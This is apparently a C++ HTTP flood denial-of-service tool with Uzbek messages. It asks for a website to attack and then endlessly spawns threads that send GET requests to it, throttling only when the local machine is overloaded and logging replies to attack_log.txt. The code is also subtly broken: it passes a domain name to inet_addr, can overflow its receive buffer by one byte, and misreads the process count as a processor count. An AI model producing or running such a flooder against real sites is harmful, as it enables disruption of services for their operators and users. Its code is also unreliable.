#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/sysinfo.h>
#include <fstream>
#include <mutex>

std::mutex log_mutex;  

void send_http_request(const std::string& host, const std::string& path, std::ofstream &log_file) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Soketni yaratishda xatolik!" << std::endl;
        return;
    }
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);  
    server.sin_addr.s_addr = inet_addr(host.c_str()); 

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        std::cerr << "Serverga ulanishda xatolik!" << std::endl;
        close(sock);
        return;
    }

    std::string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "Connection: keep-alive\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);
    std::cout << "So'rov yuborildi: " << request << std::endl;

    char buffer[1024];
    int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';  
        std::cout << "Javob: " << buffer << std::endl;

        std::lock_guard<std::mutex> lock(log_mutex);
        log_file << "So'rov: " << request << std::endl;
        log_file << "Javob: " << buffer << std::endl;
    }
    close(sock);
}

bool is_system_overloaded() {
    struct sysinfo sys_info;
    if (sysinfo(&sys_info) != 0) {
        std::cerr << "Tizim haqida ma'lumot olishda xatolik!" << std::endl;
        return false;
    }
    long long free_memory = sys_info.freeram / 1024 / 1024;  // MB
    long long total_memory = sys_info.totalram / 1024 / 1024;  // MB
    float memory_usage = (float)(total_memory - free_memory) / total_memory * 100;
    int num_processors = sys_info.procs;
    if (memory_usage > 90 || num_processors > 80) {
        return true;  
    }
    return false;
}

void start_attack(const std::string& host, const std::string& path, std::ofstream &log_file) {
    while (true) {
        if (is_system_overloaded()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));  
        } else {
            std::thread(send_http_request, host, path, std::ref(log_file)).detach();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));  
    }
}
int main() {
    std::string host;
    std::string path = "/";  

    std::cout << "Hujum qilinadigan saytning domenini kiriting (masalan: example.com): ";
    std::cin >> host;

    std::ofstream log_file("attack_log.txt", std::ios::out | std::ios::app);
    if (!log_file.is_open()) {
        std::cerr << "Log faylini ochishda xatolik!" << std::endl;
        return 1;
    }

    std::cout << "Hujum boshlanadi..." << std::endl;

    start_attack(host, path, log_file);

    return 0;
}
